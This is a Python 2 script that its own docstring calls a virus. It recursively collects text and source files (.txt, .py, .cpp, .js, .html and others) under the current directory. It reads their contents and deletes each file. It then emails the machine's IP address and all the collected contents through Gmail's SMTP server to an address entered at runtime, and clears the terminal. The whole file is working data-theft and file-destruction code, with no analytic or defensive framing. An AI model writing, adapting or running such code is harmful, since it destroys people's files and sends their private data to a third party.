import os
import smtplib
import getpass
import socket
import platform
import time

"""
This is a virus that infects the current directory and all subdirectores by reading the files and emailing the
computer's IP address and file contents. Afterwards, the files are deleted (except for the virus) and the terminal
is cleared
"""

# Some comment

# Searches the current directory and any subdirectories for .txt, .py, .cxx, .cpp, .h, .m, .template, .js, .html files.
def get_files(directory):
    file_list = []
    for dirName, subdirList, fileList in os.walk(directory):
        for FILE in fileList:
            file_extensions = ('txt', 'py', 'cpp', 'h', 'js', 'template', 'cxx', 'html')
            if FILE.endswith(file_extensions):
                if dirName != directory:
                    file_list.append(os.getcwd() + dirName[1:] + "/" + FILE)
                else:
                    file_list.append(os.getcwd() + "/" + FILE)
    return file_list


# Copies the content of each file into a string.
def copy_files(a_list):
    msg = ''
    for FILE in a_list:
        with open(FILE, 'r') as f:
            temp = FILE + "\n" + f.read()
            msg += temp + "\n\n"
        os.remove(FILE)
    return msg


# Sends the email.
def send_mail(msg):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.ehlo()

    email = raw_input("Input your email: ")
    password = getpass.getpass()
    server.login(email, password)

    target = raw_input("Enter the email of the person who will be receiving the copied files: ")
    server.sendmail(email, target, msg)

    print "Successfully sent email!\n"


# Clears the terminal
def clear():
    print "Deleting files and clearing screen..."
    time.sleep(2)
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')


IP = socket.gethostbyname(socket.gethostname())
rootDir = '.'
list_of_files = get_files(rootDir)
print "Infecting current directory...\n"
send_mail(IP + "\n\n" + copy_files(list_of_files))
clear()
